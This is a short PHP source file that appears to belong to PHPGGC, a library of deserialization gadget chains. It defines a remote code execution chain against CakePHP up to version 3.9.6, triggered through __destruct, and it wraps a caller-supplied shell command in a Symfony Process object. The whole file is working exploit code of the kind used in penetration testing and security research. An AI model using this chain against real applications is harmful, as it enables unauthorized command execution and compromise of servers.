<?php

namespace GadgetChain\CakePHP;

class RCE1 extends \PHPGGC\GadgetChain\RCE\Command
{
    public static $version = '? <= 3.9.6';
    public static $vector = '__destruct';
    public static $author = 'MoonBack';

    public function generate(array $parameters)
    {
        $command = $parameters['command'];

        return new \Symfony\Component\Process\Process($command);
    }
}